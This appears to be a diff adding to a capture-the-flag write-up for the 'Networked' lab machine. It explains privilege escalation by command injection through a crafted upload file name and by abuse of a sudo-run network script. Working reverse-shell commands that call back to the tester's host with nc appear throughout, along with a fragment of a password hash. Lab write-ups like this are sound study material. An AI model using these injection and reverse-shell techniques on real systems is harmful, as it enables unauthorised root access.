@@ -170,3 +170,67 @@ guly:$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui/1rydhlIih/PEqDI8ZsrHUsET1y93G
 ```
 
 And that's it, we're now root.
+
+# Proper Privesc - User
+This is the correct/expected way to become root before more vulnerabilites were discovered after this machine was released.
+
+From the apache access, we will discover a script in `/home/guly` labled `check_attack.php` and a file named `crontab.guly` which implies that the `check_attack.php` script is executed once every 3 minutes. Looking at the script, we can see that it loops over all files in the directory `/var/www/html/uploads/` and if the file is invalid, it will consider it an "attack", which attempts to remove it with the following line:
+```php
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+```
+
+This simply take the filename (as `$value`) and passes that on to `exec`. The vulnerability here is that we can control the filenames, so if we create a filename that can be injected into this script, it will execute it.
+
+To exploit this, we will create a file that begins with a `;` character, which is a command delimiter. Thus the first command will execute (and fail due to the file not existing) and the next command will then execute, in this case it's our `nc` command to send a reverse shell.
+
+```bash
+$ cd /var/www/html/uploads
+$ touch ';nc -c bash 10.10.14.5 8081;'
+```
+
+We are then able to catch the reverse shell:
+```bash
+$ nc -lvnp 8081
+listening on [any] 8081 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.146] 38476
+```
+
+# Proper Privesc - Root
+As the user, we can see that we're able to execute a script with sudo
+```bash
+$ sudo -l
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+
+Taking a look at that script, it writes into a network file named `/etc/sysconfig/network-scripts/ifcfg-guly`, then attempts to start it. There is a vulnerability in the way RHEL (and thus CentOS) handles this where it will simply source the file as root. When you source the file, you execute everything in the file, [see here for a description of this](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f). Thus, the way to exploit this is to insert a command into the script that sends a reverse shell back to us as root.
+
+There is a regex match preventing some special characters from being used, most notibly the `.` character can't be used. To bypass this, I created a script that may be executed, then call the script from the file.
+
+```bash
+$ cat << EOF > /tmp/shell
+> /usr/bin/nc -c 10.10.14.5 8081
+> EOF
+$ chmod a+x /tmp/shell
+$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+/bin/bash /tmp/shell
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+```
+
+Then set up a listener for the callback.
+```bash
+$ nc -lnvp 8081                                       
+listening on [any] 8081 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.146] 43700
+whoami
+root
+```
+
+
+
